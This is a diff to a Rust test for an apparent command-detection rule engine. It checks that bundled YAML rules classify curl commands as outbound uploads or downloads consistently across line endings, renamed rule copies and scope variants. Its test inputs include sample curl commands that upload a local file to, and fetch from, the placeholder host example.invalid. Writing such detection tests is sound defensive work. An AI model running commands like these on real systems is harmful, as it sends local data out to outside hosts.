@@ -1987,40 +1987,51 @@ fn evaluate_with(document: &str, command: &str) -> (Vec<String>, Vec<String>) {
 
 #[test]
 fn segment_scoped_download_follows_the_declared_yaml_in_sessions_and_keeps_native_actions() {
-    let bundled = telltale_rules::bundled_default_rule_yaml();
-    let field_copy = bundled.replace("      scope: segment\n", "");
-    let fork = bundled
-        .replace("network.download", "fork.network.download")
-        .replace("exfil.outbound_upload", "fork.exfil.outbound_upload");
+    let bundled = telltale_rules::bundled_default_rule_yaml().replace("\r\n", "\n");
     let both = ["exfil.outbound_upload", "network.download"].map(String::from);
     let upload = ["exfil.outbound_upload".to_string()];
     let separate =
         "curl --data @f https://example.invalid/upload; curl https://example.invalid/file";
     let same = "curl --data @f https://example.invalid/upload https://example.invalid/file";
 
-    // Bundled: the session reads the declared segment scope; native actions
-    // read HTTP direction per command stage, as before.
-    assert_eq!(
-        evaluate_with(bundled, separate),
-        (both.to_vec(), both.to_vec())
-    );
-    assert_eq!(
-        evaluate_with(bundled, same),
-        (upload.to_vec(), upload.to_vec())
-    );
+    for newline in ["\n", "\r\n"] {
+        let bundled = bundled.replace('\n', newline);
+        let normalized = bundled.replace("\r\n", "\n");
+        assert_eq!(normalized.matches("      scope: segment\n").count(), 1);
+        let field_copy = normalized.replace("      scope: segment\n", "");
+        assert!(!field_copy.contains("      scope: segment"));
+        let explicit_field = normalized.replace("      scope: segment\n", "      scope: field\n");
+        let fork = bundled
+            .replace("network.download", "fork.network.download")
+            .replace("exfil.outbound_upload", "fork.exfil.outbound_upload");
 
-    // A renamed copy matches the same way in sessions: no rule ID selects it.
-    let (fork_separate, _) = evaluate_with(&fork, separate);
-    assert_eq!(
-        fork_separate,
-        ["fork.exfil.outbound_upload", "fork.network.download"]
-    );
-    assert_eq!(evaluate_with(&fork, same).0, ["fork.exfil.outbound_upload"]);
+        // Bundled: the session reads the declared segment scope; native actions
+        // read HTTP direction per command stage, as before.
+        assert_eq!(
+            evaluate_with(&bundled, separate),
+            (both.to_vec(), both.to_vec())
+        );
+        assert_eq!(
+            evaluate_with(&bundled, same),
+            (upload.to_vec(), upload.to_vec())
+        );
 
-    // A same-ID copy that declares field scope is a different predicate, so
-    // it is evaluated as written, not as the bundled native profile.
-    assert_eq!(
-        evaluate_with(&field_copy, separate),
-        (upload.to_vec(), upload.to_vec())
-    );
+        // A renamed copy matches the same way in sessions: no rule ID selects it.
+        let (fork_separate, _) = evaluate_with(&fork, separate);
+        assert_eq!(
+            fork_separate,
+            ["fork.exfil.outbound_upload", "fork.network.download"]
+        );
+        assert_eq!(evaluate_with(&fork, same).0, ["fork.exfil.outbound_upload"]);
+
+        // Same-ID copies with omitted or explicit field scope are different
+        // predicates, so neither is mistaken for the bundled native profile.
+        for document in [&field_copy, &explicit_field] {
+            let document = document.replace('\n', newline);
+            assert_eq!(
+                evaluate_with(&document, separate),
+                (upload.to_vec(), upload.to_vec())
+            );
+        }
+    }
 }
